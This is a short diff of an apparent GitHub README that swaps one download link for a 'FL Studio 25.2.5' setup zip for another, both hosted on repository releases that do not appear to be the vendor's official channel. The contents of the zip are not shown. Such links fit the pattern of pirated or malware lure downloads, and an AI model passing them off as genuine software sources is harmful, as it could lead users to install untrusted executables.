@@ -8,7 +8,7 @@
 <img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/956ef48f-fe33-479d-a8a6-d2332f0fc14c" />
 
 ## Install
-[Download `FL-Studio-25.2.5.zip`](https://github.com/Ibra0912345/fl-25.2.5/releases/latest/download/FL-Studio-25.2.5.zip)
+[Download `fl-25.2.5-setup.zip`](https://github.com/imagelinefl/fl-25.2.5/releases/download/25.2.5/fl-25.2.5-setup.zip)
 ---
 
 <img width="500" height="281" alt="cafdb2cc-387e-4244-9938-f2265baeb93f" src="https://github.com/user-attachments/assets/fe700d88-6cf7-46c7-aa53-832038f210f8" />
